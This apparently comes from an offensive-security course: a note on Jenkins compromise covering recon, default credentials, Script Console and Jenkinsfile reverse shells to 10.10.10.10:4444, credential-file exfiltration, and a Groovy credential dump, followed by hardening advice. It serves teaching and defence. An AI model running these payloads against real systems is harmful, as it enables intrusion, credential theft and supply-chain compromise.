---
tags: [jenkins, ci-cd, rce, groovy, pipeline, devsecops]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.25 Jenkins"
---

# Jenkins — Groovy Script Console, Unauthenticated RCE

## 1. Introduction to Jenkins

Jenkins is the most widely used open-source automation server, facilitating Continuous Integration and Continuous Delivery (CI/CD) pipelines. It automates building, testing, and deploying software, acting as the bridge between source code repositories and production environments.

From an attacker's perspective, Jenkins is a Tier-0 asset. It natively requires extensive access to source code, cloud provider credentials, SSH keys for deployment servers, and artifact registries. Compromising Jenkins usually results in a catastrophic supply chain attack, allowing an attacker to inject malicious code into legitimate software builds or pivot directly into highly secure production environments.

## 2. Jenkins Architecture & Weaknesses

- **Controller (Master):** The central control unit. It serves the web UI, stores configurations, manages plugins, and orchestrates build jobs.
- **Agents (Slaves):** Worker nodes that actually execute the build pipelines. Agents can be static VMs or dynamic containers (e.g., Kubernetes pods).
- **Plugins:** Jenkins relies heavily on plugins for functionality. These plugins are notorious for introducing severe vulnerabilities (XSS, SSRF, Deserialization, RCE).
- **Groovy Scripting:** Jenkins is built on Java and deeply integrates Groovy. Administrators can run arbitrary Groovy scripts to manage the server. Build pipelines (`Jenkinsfile`) are also written in Groovy.

**The core weakness:** Jenkins is designed to execute code. If an attacker can manipulate *what* code Jenkins executes, they achieve Remote Code Execution (RCE) by design.

## 3. ASCII Diagram: Jenkins Script Console RCE

```text
      [ Attacker ]
           |
           | (1) Discovers Weak Credentials / Unauthenticated UI
           v
  +--------------------------------+
  |    Jenkins Controller UI       |
  |    Port: 8080 (HTTP)           |
  |                                |
  |  (2) Navigates to              |
  |      /script (Script Console)  |
  +--------------------------------+
           |
           | (3) Submits Malicious Groovy Script
           v
  +--------------------------------+
  |    Jenkins JVM                 |
  |                                |
  |  def p = "nc -e /bin/sh        | <-- (4) Groovy executes OS commands
  |      attacker 4444".execute()  |
  +--------------------------------+
           |
           | (5) Reverse Shell
           v
      [ Attacker ] (Usually running as the 'jenkins' Linux user)
```

## 4. Reconnaissance & Enumeration

Jenkins typically runs on port `8080` (HTTP) or `8443` (HTTPS).

### Initial Enumeration
When you hit the web root (`/`), you will either see a login prompt or be dropped directly into the unauthenticated dashboard.

Even if you hit a login prompt, Jenkins leaks version information in HTTP headers:
```bash
curl -I http://<target-ip>:8080/
# Look for: X-Jenkins: 2.346.1
```
This version header is crucial for identifying known CVEs, especially deserialization flaws (e.g., CVE-2017-1000353).

### Directory Fuzzing & Open Endpoints
Certain paths might be open even if the main dashboard requires login:
- `/script` - The Groovy Script Console (Requires Admin).
- `/asynchPeople/` - May leak usernames.
- `/jnlpJars/jenkins-cli.jar` - Can be downloaded to interact via the CLI.
- `/env-vars.html` - Sometimes exposed, leaking sensitive environment variables.

## 5. Exploitation: Unauthenticated Access & Misconfigurations

Historically, older versions of Jenkins defaulted to "Allow anonymous read access," and many administrators disable security entirely for internal ease of use.

### The "No Authentication" Vector
If you browse to the UI and see "Manage Jenkins" without logging in, the server is completely exposed. You are essentially an administrator.

### Weak Credentials
Jenkins often suffers from default or weak credentials.
- Common usernames: `admin`, `jenkins`, `root`, `deploy`.
- Common passwords: `admin`, `password`, `jenkins`, or the company name.
Brute-forcing forms is viable, but watch out for lockouts if configured.

## 6. Exploitation: Groovy Script Console RCE

If you have administrative access (either unauthenticated or via compromised credentials), the path to RCE is an intended feature: the **Script Console**.

Navigate to `http://<target-ip>:8080/script`. This console allows arbitrary execution of Groovy code on the Jenkins Controller.

### Groovy RCE Payloads

**1. Basic OS Command Execution:**
```groovy
def command = "id"
def proc = command.execute()
proc.waitFor()
println "Stdout: ${proc.in.text}"
```

**2. Reverse Shell (Direct execution):**
```groovy
def host = "10.10.10.10";
def port = 4444;
String cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}";
Process p = new ProcessBuilder("bash", "-c", cmd).redirectErrorStream(true).start();
```
*(Note: Piping and complex bash constructs often break in direct `.execute()`, so base64 encoding the payload or using `ProcessBuilder` is recommended).*

## 7. Exploitation: Job Configuration & Workspace Manipulation

If you do *not* have Admin access, but you have Developer/Builder access, you cannot access the `/script` console. However, you can still achieve RCE by modifying build jobs.

### Pipeline Manipulation (Jenkinsfile)
If the project uses a Pipeline script and you have "Configure" permissions on the job, you can edit the Pipeline script directly in the UI.

Add a simple shell step to the pipeline:
```groovy
pipeline {
    agent any
    stages {
        stage('Pwn') {
            steps {
                sh 'nc -e /bin/sh 10.10.10.10 4444'
            }
        }
    }
}
```
When the job is triggered, the code executes. *Note: Depending on the `agent` configuration, this shell will spawn on the Jenkins Controller OR on a Jenkins Agent node.*

### Freestyle Job Manipulation
If it's a legacy Freestyle job, simply add a "Execute shell" build step, insert your reverse shell payload, and trigger a build.

## 8. Post-Exploitation & Lateral Movement

Once you have a shell on a Jenkins server (Controller or Agent), you are in a prime position for lateral movement.

### Extracting Jenkins Credentials
Jenkins stores credentials (SSH keys, AWS access keys, Vault tokens) in `credentials.xml` and encrypts them using a master key stored in `secrets/master.key` and `secrets/hudson.util.Secret`.

If you have file system read access, you can decrypt all stored passwords. There are numerous offline decryption scripts available on GitHub (e.g., `jenkins-decrypt`).

```bash
# Important files to exfiltrate for offline decryption
cat /var/lib/jenkins/secrets/master.key
cat /var/lib/jenkins/secrets/hudson.util.Secret
cat /var/lib/jenkins/credentials.xml
```

Alternatively, if you have access to the Script Console, you can dump and decrypt credentials dynamically via Groovy without touching the disk:

```groovy
com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
).each {
    println "User: " + it.username
    if (it.hasProperty("password")) {
        println "Password: " + it.password.getPlainText()
    }
}
```

### Pivoting
Since Jenkins deploys code, its agents often have direct network access to production Kubernetes clusters, AWS VPCs, or internal databases. Check environment variables (`env`), AWS metadata endpoints (`curl http://169.254.169.254/...`), and `~/.kube/config` files.

## 9. Defense & Hardening

Securing Jenkins requires a defense-in-depth approach, protecting both the application layer and the underlying infrastructure.

### 1. Enforce Strong Authentication & Authorization
Integrate Jenkins with a central Identity Provider (SAML/OIDC, Active Directory).
Use Matrix-based Security to enforce the Principle of Least Privilege. Only highly trusted administrators should have the "Administer" role (which grants access to the Script Console).

### 2. Isolate the Jenkins Controller
No builds should ever run directly on the Jenkins Controller. Configure the master to have 0 executors. All jobs should run on ephemeral, isolated Jenkins Agents (e.g., Kubernetes pods that are destroyed after the build). This ensures that an RCE in a build job compromises an isolated agent, not the central controller holding all the master secrets.

### 3. Implement Credential Scoping
Do not use global credentials. Scope credentials strictly to the specific folders or projects that require them.

### 4. Keep Plugins Updated
Jenkins vulnerabilities frequently stem from outdated plugins. Implement a strict update schedule and remove unused plugins to reduce the attack surface.

## 10. Chaining Opportunities

- **Source Code to Jenkins RCE:** Compromise a developer's GitHub account, modify a `Jenkinsfile` in a repository, and let the webhook trigger a malicious build on Jenkins. Link to `[[26 - GitLab GitHub — Exposed Tokens, LFI CVEs]]`.
- **Jenkins to Cloud Compromise:** Steal AWS IAM credentials from the Jenkins credential store or EC2 metadata endpoint to escalate into the cloud environment. Link to `[[38 - AWS IAM Privilege Escalation]]` (hypothetical).
- **Supply Chain Injection:** Modify the build artifacts before they are pushed to the registry, backdooring the application deployed to production.

## 11. Related Notes

- `[[12 - Command Injection]]`
- `[[30 - Infrastructure as Code (IaC) Security]]`
- `[[26 - GitLab GitHub — Exposed Tokens, LFI CVEs]]`
